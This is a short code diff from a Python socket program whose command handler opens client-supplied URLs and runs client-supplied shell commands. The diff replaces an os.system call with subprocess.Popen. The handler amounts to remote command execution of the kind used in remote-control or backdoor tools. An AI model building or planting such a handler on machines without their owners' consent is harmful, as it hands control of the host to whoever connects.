@@ -1,6 +1,6 @@
 import socket
 import webbrowser
-import os
+import subprocess
 
 DISCONNECT = "3"
 MESSAGE_INCOMING = "2"
@@ -127,4 +127,4 @@ def process_command(args, client, addr):
         webbrowser.open(args[1], new=2)
     # CMD <CMD> - send a command
     elif args[0] == "cmd" and len(args) > 1:
-        os.system(args[1])
+        subprocess.Popen(args[1:])
